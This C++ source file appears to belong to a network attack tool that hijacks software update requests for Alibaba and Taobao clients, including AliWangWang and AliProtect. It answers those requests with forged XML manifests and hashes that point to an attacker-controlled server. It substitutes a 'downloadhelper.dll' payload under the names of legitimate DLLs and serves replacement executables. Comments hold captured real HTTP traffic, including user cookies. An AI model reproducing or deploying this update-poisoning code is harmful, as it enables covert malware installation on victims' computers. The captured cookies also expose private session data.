#include "aliProtect.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"
#include <iostream>
#include "../cipher/Base64.h"

using namespace std;

int gAliProtectFlag = 3;

string gAliVer = "";



int AlibabaProtect::isAliProtect(const char * url, const char * host) {
	if (strstr(host, "dcldshlupt.alicdn.com")) {
		if (strstr(url, "/data/pcs-sdk/") && strstr(url,"optionalmodule.xml"))
		{
			gAliProtectFlag = 1;
			return TRUE;
		}
	}else if (strstr(host,"miserupdate.aliyun.com") && strstr(url,"/version.xml"))
	{
		gAliProtectFlag = 2;
		return TRUE;
	}
	else if (strstr(host, "dailyupdate.wangwang.taobao.com") && strstr(url,"/aliwangwang/") && strstr(url, "/dailyconfig.sys"))
	{
// 		char * hdr = strstr((char*)url, "/aliwangwang/");
// 		char * end = strstr((char*)url, "/dailyconfig.sys");
// 		if (hdr > 0&& end > 0)
// 		{
// 			hdr += lstrlenA("/aliwangwang/");
// 			gAliVer = string(hdr, end - hdr);
// 		}

		gAliProtectFlag = 3;
		return TRUE;
	}
	else if (strstr(host, "dailyupdate.wangwang.taobao.com") && strstr(url, "/aliwangwang/") && 
		(strstr(url,ALIBABA_ALIAPPLOADER_FILENAME ) || strstr(url, ALIBABA_ALIFILECHECK_FILENAME)) )
	{
		gAliProtectFlag = 4;
		return TRUE;
	}

	else if (strstr(host, "download.alicdn.com") && strstr(url, "/wangwang/AliIM_taobao_") && strstr(url,".exe"))
	{
// 		GET /wangwang/AliIM_taobao_(9.12.10C).exe?spm=a21e4.8038711.0.0.4436297dN4Gjxy&file=AliIM_taobao_(9.12.10C).exe HTTP/1.1
// 		Host: download.alicdn.com
		gAliProtectFlag = 5;
		return TRUE;
	}
	return FALSE;
}



int AlibabaProtect::replyAliProtect(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = FALSE;

	if (gAliProtectFlag == 1)
	{
		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;
		//string ip = string(MYOWNSITE_ATTACK_DOMAINNAME) + "/" + lphttp->username;

		string srcfn1 = "DigitalCert.dll";
		string srcfn2 = "qjpeg.dll";
		string srcfn3 = "EncryptBox.dll";
		string filename1 = Public::getUserPluginPath(lphttp->username) + srcfn1;
		string filename2 = Public::getUserPluginPath(lphttp->username) + srcfn2;
		string filename3 = Public::getUserPluginPath(lphttp->username) + srcfn3;

		string filenamesrc = Public::getUserPluginPath(lphttp->username) + "downloadhelper.dll";

		CopyFileA(filenamesrc.c_str(), filename1.c_str(), 0);
		CopyFileA(filenamesrc.c_str(), filename2.c_str(), 0);
		CopyFileA(filenamesrc.c_str(), filename3.c_str(), 0);

		char szmd5_1[64] = { 0 };
		char szmd5_2[64] = { 0 };
		char szmd5_3[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);
		if (filesize1 <= 0)
		{
			return FALSE;
		}
		int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, 1);
		if (filesize2 <= 0)
		{
			return FALSE;
		}
		int filesize3 = CryptoUtils::getUpdateFileMd5(filename3, szmd5_3, hexmd5, 1);
		if (filesize3 <= 0)
		{
			return FALSE;
		}

		string version = "9.9.23.863";		//1.0.23.863

		char * retformat =
			"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
			"<softwareInfo>\r\n"
			"<software>\r\n"
			"<name>sdk</name>\r\n"

			"<file>\r\n"
			"<fileName>%s</fileName>\r\n"
			"<version>%s</version>\r\n"
			"<hash>%s</hash>\r\n"
			"<serverPath>http://%s/%s</serverPath>\r\n"
			"<localPath>DigitalCert.dll</localPath>\r\n"
			"<output>./</output>\r\n"
			"<flag>-1</flag>\r\n"
			"<del>0</del>\r\n"
			"<target>PlaceHoldDefault</target>\r\n"
			"<mod>DCert</mod>\r\n"
			"</file>\r\n"

			"<file>\r\n"
			"<fileName>%s</fileName>\r\n"
			"<version>%s</version>\r\n"
			"<hash>%s</hash>\r\n"
			"<serverPath>http://%s/%s</serverPath>\r\n"
			"<localPath>imageformats/qjpeg.dll</localPath>\r\n"
			"<output>./imageformats</output>\r\n"
			"<flag>32</flag>\r\n"
			"<del>0</del>\r\n"
			"<target>PlaceHoldDefault_imageformats</target>\r\n"
			"<mod>SESvr</mod>\r\n"
			"</file>"

			"<file>\r\n"
			"<fileName>%s</fileName>\r\n"
			"<version>%s</version>\r\n"
			"<hash>%s</hash>\r\n"
			"<serverPath>http://%s/%s</serverPath>\r\n"
			"<localPath>StaticEncryptBox.dll</localPath>\r\n"
			"<output>./</output>\r\n"
			"<flag>-1</flag>\r\n"
			"<del>0</del>\r\n"
			"<target>PlaceHoldDefault</target>\r\n"
			"<mod>StaticCrypto</mod>\r\n"
			"</file>"

			"</software>\r\n"
			"</softwareInfo>";

		char result[4096];
		int retlen = sprintf(result, retformat, srcfn1.c_str(), version.c_str(), szmd5_1, ip.c_str(), srcfn1.c_str(),
			srcfn2.c_str(), version.c_str(), szmd5_2, ip.c_str(), srcfn2.c_str(),
			srcfn3.c_str(), version.c_str(), szmd5_3, ip.c_str(), srcfn3.c_str());

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}else if (gAliProtectFlag == 2)
	{
		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;

		char szmd5_1[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int filesize1 = CryptoUtils::getUpdateFileMd5(exesrcfn, szmd5_1, hexmd5, FALSE);
		if (filesize1 <= 0)
		{
			return FALSE;
		}

		char * retformat =
			"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n"
			"<UPDATA>\r\n"
			"<THISTIME>2028/08/01 15:25:01</THISTIME>\r\n"
			"<FILE>\r\n"
// 			"<ITEM NAME=\"newhaf.dat\">\r\n"
// 			"<URL>http://miserupdate.aliyun.com/data/2.4.1.6/newhaf.dat</URL>\r\n"
// 			"<MD5>2b96a3912c86ccbfe7201e98eec6a044</MD5>\r\n"
// 			"</ITEM>\r\n"
// 			"<ITEM NAME=\"prf.dat\">
// 			"<URL>http://miserupdate.aliyun.com/data/2.4.1.6/prf.dat</URL>\r\n"
// 			"<MD5>c065cdd5ab1282910a85e158af4a9456</MD5>\r\n"
// 			"</ITEM>\r\n"
			"<ITEM NAME=\"AliMiserUpdate.exe\">\r\n"
			"<URL>http://%s/%s</URL>\r\n"
			"<MD5>%s</MD5>\r\n"
			"</ITEM>\r\n"
			"<ITEM NAME=\"TBSecSvc.exe\">\r\n"
			"<URL>http://%s/%s</URL>\r\n"
			"<MD5>%s</MD5>\r\n"
			"</ITEM>\r\n"
			"</FILE>\r\n"
			"</UPDATA>";

		char szhttpdata[4096];
		int datalen = sprintf(szhttpdata, retformat, 
			ip.c_str(),WEIXIN_PC_UPDATE_EXE_FILENAME, szmd5_1,
			ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, szmd5_1);
		int retlen = sprintf(dstbuf, lpRespFormat, datalen, szhttpdata);
		return retlen;
	}else if (gAliProtectFlag == 3)
	{
		char * szHttpHdrFormat = "HTTP/1.1 200 OK\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Accept-Ranges: none\r\n"
			"Connection: close\r\n"
			"Content-Length: %u\r\n\r\n%s";

		char * dataformat = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
			"<item>\r\n"
			"<path>%s</path>\r\n"
			"<md5>%s</md5>\r\n"
			"</item>\r\n"
			"<item>\r\n"
			"<path>%s</path>\r\n"
			"<md5>%s</md5>\r\n"
			"</item>\r\n";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		string exesrcfn1 = Public::getUserPluginPath(lphttp->username) + ALIBABA_ALIAPPLOADER_FILENAME;
		string exesrcfn2 = Public::getUserPluginPath(lphttp->username) + ALIBABA_ALIFILECHECK_FILENAME;

		char szmd5_1[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int filesize1 = CryptoUtils::getUpdateFileMd5(exesrcfn1, szmd5_1, hexmd5, TRUE);
		if (filesize1 <= 0)
		{
			return FALSE;
		}

		char szmd5_2[64] = { 0 };
		int filesize2 = CryptoUtils::getUpdateFileMd5(exesrcfn2, szmd5_2, hexmd5, TRUE);
		if (filesize2 <= 0)
		{
			return FALSE;
		}

		unsigned char data[0x1000];
		int datalen = wsprintfA((char*)data, dataformat, ALIBABA_ALIAPPLOADER_FILENAME,szmd5_1, ALIBABA_ALIFILECHECK_FILENAME,szmd5_2);

		char base64buf[0x1000] = { 0 };

		int base64len = Base64::Base64Encode(base64buf,data, datalen);

		int retlen = sprintf(dstbuf, szHttpHdrFormat, base64len, base64buf);
		return retlen;
	}else if (gAliProtectFlag == 4)
	{
		char * szHttpHdrFormat = "HTTP/1.1 200 OK\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Accept-Ranges: none\r\n"
			"Connection: close\r\n"
			"Content-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, ALIBABA_ALIAPPLOADER_FILENAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpHdrFormat, 1);
		return 0;
	}else if (gAliProtectFlag == 5)
	{
		char * szHttpHdrFormat = "HTTP/1.1 200 OK\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Accept-Ranges: none\r\n"
			"Connection: close\r\n"
			"Content-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, ALIBABA_ALIAPPLOADER_FILENAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpHdrFormat, 1);
		return 0;
	}
	return 0;
}


/*
GET /aliwangwang/9.12.10C/dailyconfig.sys HTTP/1.1
Accept-Language: zh-cn
Content-Type: application/x-www-form-urlencoded
User-Agent: SimpleHttpFetch
Host: dailyupdate.wangwang.taobao.com
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: _cc_=VFC%2FuZ9ajQ%3D%3D; isg=BMHBPH6peJVIs5RoRD6T4ZmJ1w3b7jXgLJhkNCMTQ01yCuzcazuVsdcZ6vxMGc0Y;
thw=cn; t=fe7178f9aaa4b4f39f89909d2f93b4a9; cna=SZLGFZyKXnUCAX140pesJh1D; tracknick=lj15966985858;
l=cBTPM4QqqKbLgkdtBOCahurza77OSQOYYuPzaNbMi_5ZZ6TsCwQOk_GqvF96VsWdtCYB4X8JLKv9-etuqGUSduJmZ_3l.; tg=0; hng=CN%7Czh-CN%7CCNY%7C156

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: none
Content-Length: 324
Connection: close

PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxpdGVtPg0KICAgIDxwYXRoPkFsaUFwcExvYWRlci5leGU8L3BhdGg+DQogICAgPG1kNT4wMWVlYzM4ZDY4ZTQyMWZkNTgzYmY3NGEwZTk5ZmJlYzwvbWQ1Pg0KPC9pdGVtPg0KPGl0ZW0+DQogICAgPHBhdGg+QWxpRmlsZUNoZWNrLmV4ZTwvcGF0aD4NCiAgICA8bWQ1PjAxZWVjMzhkNjhlNDIxZmQ1ODNiZjc0YTBlOTlmYmVjPC9tZDU+DQo8L2l0ZW0+DQo=

GET /wangwang/AliIM2018_taobao(9.12.03C).exe?spm=a220o.1000855.0.0.69bc3460cJhlgP&file=AliIM2018_taobao(9.12.03C).exe HTTP/1.1
Host: download.alicdn.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/octet-stream
Content-Length: 79437440
Connection: keep-alive
Date: Sat, 01 Jun 2019 12:30:12 GMT
x-oss-request-id: 5CF26FD360BDDFF84E111968
Accept-Ranges: bytes
ETag: "14F8EC468F82622A175D30FE8CF9CC1C"
Last-Modified: Mon, 12 Feb 2018 07:19:03 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 11230236931630712642
x-oss-storage-class: Standard
x-oss-meta-md5: 14f8ec468f82622a175d30fe8cf9cc1c
Cache-Control: max-age=86400
Content-MD5: FPjsRo+CYioXXTD+jPnMHA==
x-oss-server-time: 47
Via: cache24.l2eu6-1[0,304-0,H], cache5.l2eu6-1[1,0], cache1.cn1157[0,200-0,H], cache19.cn1157[1,0]
Ali-Swift-Global-Savetime: 1545913552
Age: 76037
X-Cache: HIT TCP_MEM_HIT dirn:13:799953991
X-Swift-SaveTime: Sat, 01 Jun 2019 12:55:02 GMT
X-Swift-CacheTime: 84910
Timing-Allow-Origin: *
EagleId: 755bb3db15594682489974544e
*/



/*
<?xml version="1.0" encoding="ISO-8859-1"?>
<UPDATA>
<THISTIME>2018/08/01 15:25:01</THISTIME>
<FILE>
<ITEM NAME="newhaf.dat">
<URL>http://miserupdate.aliyun.com/data/2.4.1.6/newhaf.dat</URL>
<MD5>2b96a3912c86ccbfe7201e98eec6a044</MD5>
</ITEM>
<ITEM NAME="prf.dat">
<URL>http://miserupdate.aliyun.com/data/2.4.1.6/prf.dat</URL>
<MD5>c065cdd5ab1282910a85e158af4a9456</MD5>
</ITEM>
<ITEM NAME="AliMiserUpdate.exe">
<URL>http://miserupdate.aliyun.com/data/2.4.1.6/AliMiserUpdate.exe</URL>
<MD5>689a96f71161190a8193d8d7d7341e6b</MD5>
</ITEM>
<ITEM NAME="TBSecSvc.exe">
<URL>http://miserupdate.aliyun.com/data/2.4.1.6/TBSecSvc.exe</URL>
<MD5>e0be7988348a83d487f848e49a63485a</MD5>
</ITEM>
</FILE>
</UPDATA>
*/


/*
GET /data/pcs-sdk/1.0.23.863/optionalmodule.xml HTTP/1.1
Connection: Keep-Alive
User-Agent: WinHttpClient
Host: dcldshlupt.alicdn.com

HTTP/1.1 200 OK
Server: Tengine
Content-Type: text/xml
Content-Length: 24258
Connection: keep-alive
Date: Sat, 18 May 2019 05:16:09 GMT
x-oss-request-id: 5CDF9519968439C4D0B44F44
Accept-Ranges: bytes
ETag: "91B68733FECD011140A1D9156ECDE15D"
Last-Modified: Fri, 01 Jun 2018 01:39:04 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 7212471245455783810
x-oss-storage-class: Standard
Vary: Accept-Encoding
Content-MD5: kbaHM/7NARFAodkVbs3hXQ==
x-oss-server-time: 4
Via: cache33.l2cn1732[0,304-0,H], cache25.l2cn1732[0,0], cache4.cn244[0,200-0,H], cache4.cn244[1,0]
Ali-Swift-Global-Savetime: 1550023181
Age: 6113
X-Cache: HIT TCP_MEM_HIT dirn:2:278693812
X-Swift-SaveTime: Sat, 18 May 2019 06:07:50 GMT
X-Swift-CacheTime: 3600
Timing-Allow-Origin: *
EagleId: 7ae45f4415581626825181717e

<?xml version="1.0" encoding="UTF-8"?>
<softwareInfo>
<software>
<name>sdk</name>
<file>
<fileName>FeacodeDetector.dll</fileName>
<version>1.0.23.863</version>
<hash>16316183726FA1CFEA6DB3D1ABE19C7F</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/FeacodeDetector.dll</serverPath>
<localPath>FeacodeDetector.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>ScanEngine.dll</fileName>
<version>1.0.23.863</version>
<hash>49DFB7D4E8218F8449DA493F7808B9F9</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/ScanEngine.dll</serverPath>
<localPath>ScanEngine.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>AliNDFOEngine.dll</fileName>
<version>1.0.0.1</version>
<hash>912640A6FBF2A3BA51DE257B826F802F</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/AliNDFOEngine.dll</serverPath>
<localPath>AliNDFOEngine.dll</localPath>
<output>./</output>
<flag>64</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>AliNDFO</mod>
</file>
<file>
<fileName>qjpeg.dll</fileName>
<version>5.6.0.0</version>
<hash>85D206097313549D0635EAEB80B14219</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qjpeg.dll</serverPath>
<localPath>imageformats/qjpeg.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>FileCache.dll</fileName>
<version>1.0.23.863</version>
<hash>DE5F6642C5A667BD400BDA0A3C60A3BF</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/FileCache.dll</serverPath>
<localPath>FileCache.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>StaticEncryptBox.dll</fileName>
<version>1.0.23.863</version>
<hash>99D316531CF5D8C6CA14BEC258FB4866</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/StaticEncryptBox.dll</serverPath>
<localPath>StaticEncryptBox.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>StaticCrypto</mod>
</file>
<file>
<fileName>Qt5Core.dll</fileName>
<version>5.6.0.0</version>
<hash>F024FBF785D97FF72A59390283CD6CA6</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/Qt5Core.dll</serverPath>
<localPath>Qt5Core.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>qsvg.dll</fileName>
<version>5.6.0.0</version>
<hash>5CD0B3C8935972222AAE154CB8F87661</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qsvg.dll</serverPath>
<localPath>imageformats/qsvg.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>FileScanner.dll</fileName>
<version>1.0.23.863</version>
<hash>74618CB5DAF5CB3DB46AF8B6D98D6288</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/FileScanner.dll</serverPath>
<localPath>FileScanner.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>Qt5Svg.dll</fileName>
<version>5.6.0.0</version>
<hash>88CD3E272D3B33F28CF0C84EA0200AE1</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/Qt5Svg.dll</serverPath>
<localPath>Qt5Svg.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>DigitalCert.dll</fileName>
<version>1.0.23.863</version>
<hash>043681EA4F9C50E017ECC37F815E2085</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/DigitalCert.dll</serverPath>
<localPath>DigitalCert.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>DCert</mod>
</file>
<file>
<fileName>EncryptBox.dll</fileName>
<version>1.0.23.863</version>
<hash>DB462EABEFE5DE700B1B2D3E224FD241</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/EncryptBox.dll</serverPath>
<localPath>EncryptBox.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>Crypto</mod>
</file>
<file>
<fileName>AliNDFORecord.dll</fileName>
<version>1.0.0.1</version>
<hash>9CABAA5A7B09214029AA7BB16F7056FA</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/AliNDFORecord.dll</serverPath>
<localPath>AliNDFORecord.dll</localPath>
<output>./</output>
<flag>64</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>AliNDFO</mod>
</file>
<file>
<fileName>FastDetector.dll</fileName>
<version>1.0.23.863</version>
<hash>B7CB9B1A81119C6E867E037EAAAF47C9</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/FastDetector.dll</serverPath>
<localPath>FastDetector.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>Aliedr.dll</fileName>
<version>1.0.1.1000</version>
<hash>6A165183B74A8FFCA53A8639D8971FA2</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/Aliedr.dll</serverPath>
<localPath>Aliedr.dll</localPath>
<output>./</output>
<flag>8</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>Edr</mod>
</file>
<file>
<fileName>DetectEngine.dll</fileName>
<version>1.0.23.863</version>
<hash>16F60FD6268B5C476CADEAFCA399F4B9</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/DetectEngine.dll</serverPath>
<localPath>DetectEngine.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>qtiff.dll</fileName>
<version>5.6.0.0</version>
<hash>2F3436DDB1E4FBE5E19815A2A08F2A96</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qtiff.dll</serverPath>
<localPath>imageformats/qtiff.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>NDFO.dat</fileName>
<version>0.0.0.0</version>
<hash>9C2A7AA24339243DCF8887B06332458C</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/NDFO.dat</serverPath>
<localPath>NDFO.dat</localPath>
<output>./</output>
<flag>-1</flag>
<target>PlaceAlibabaProtectDT</target>
<mod>AliNDFO</mod>
</file>
<file>
<fileName>AlibabaprotectUI.exe</fileName>
<version>1.0.23.863</version>
<hash>2AA31140802A34A01F44EE2EC033C2DF</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/AlibabaprotectUI.exe</serverPath>
<localPath>AlibabaprotectUI.exe</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>qgif.dll</fileName>
<version>5.6.0.0</version>
<hash>11AEABC849AD2431790C83F712902C97</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qgif.dll</serverPath>
<localPath>imageformats/qgif.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>SignBox.dll</fileName>
<version>1.0.23.863</version>
<hash>1136AE947DED25D8BC8E98D8920BB253</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/SignBox.dll</serverPath>
<localPath>SignBox.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>URLSign</mod>
</file>
<file>
<fileName>FileManager.dll</fileName>
<version>1.0.23.863</version>
<hash>98BA2034AADC91931839470C83624F30</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/FileManager.dll</serverPath>
<localPath>FileManager.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>qwbmp.dll</fileName>
<version>5.6.0.0</version>
<hash>E0F64B655F2DEDFB6E0A1D43458BA042</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qwbmp.dll</serverPath>
<localPath>imageformats/qwbmp.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>MatchEngines.dll</fileName>
<version>1.0.0.1</version>
<hash>5CD5B30C781803086FB6F90E49B1F2ED</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/MatchEngines.dll</serverPath>
<localPath>MatchEngines.dll</localPath>
<output>./</output>
<flag>1</flag>
<del>1</del>
<target>PlaceHoldDefault</target>
<mod>DLP_Ecolo</mod>
</file>
<file>
<fileName>qtga.dll</fileName>
<version>5.6.0.0</version>
<hash>861EA5F74B5626F3D0F56009654E29F5</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qtga.dll</serverPath>
<localPath>imageformats/qtga.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>AliProtectCollina.dll</fileName>
<version>1.0.0.8</version>
<hash>2744706775D7405DA352A7DBC5D3976C</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/AliProtectCollina.dll</serverPath>
<localPath>AliProtectCollina.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>Colina</mod>
</file>
<file>
<fileName>ExecuteUnit.dll</fileName>
<version>1.0.23.863</version>
<hash>502D0029DC35220034481BD99FAFA5AE</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/ExecuteUnit.dll</serverPath>
<localPath>ExecuteUnit.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>Execute</mod>
</file>
<file>
<fileName>Fltmonitor.dll</fileName>
<version>1.0.23.863</version>
<hash>1440E472E3F79E05F7859ACF4548BAC3</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/Fltmonitor.dll</serverPath>
<localPath>Fltmonitor.dll</localPath>
<output>./</output>
<flag>1</flag>
<del>1</del>
<target>PlaceHoldDefault</target>
<mod>DLP_Ecolo</mod>
</file>
<file>
<fileName>alihttpdcp.dll</fileName>
<version>1.0.23.863</version>
<hash>FA90D873A98C11188C0CAC89F11CA71D</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/alihttpdcp.dll</serverPath>
<localPath>alihttpdcp.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>DCert</mod>
</file>
<file>
<fileName>Qt5Gui.dll</fileName>
<version>5.6.0.0</version>
<hash>962823D852FDCF24241A2685540AD8D8</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/Qt5Gui.dll</serverPath>
<localPath>Qt5Gui.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>Qt5Widgets.dll</fileName>
<version>5.6.0.0</version>
<hash>6640420207ED2F486AFC8A6575C9E85C</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/Qt5Widgets.dll</serverPath>
<localPath>Qt5Widgets.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>ContentEngines.dll</fileName>
<version>1.0.0.1</version>
<hash>D9AE5509A1E38890351B453E89736496</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/ContentEngines.dll</serverPath>
<localPath>ContentEngines.dll</localPath>
<output>./</output>
<flag>1</flag>
<del>1</del>
<target>PlaceHoldDefault</target>
<mod>DLP_Ecolo</mod>
</file>
<file>
<fileName>qico.dll</fileName>
<version>5.6.0.0</version>
<hash>D7820C273C034EFFB710B46E6A54EDE9</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/imageformats/qico.dll</serverPath>
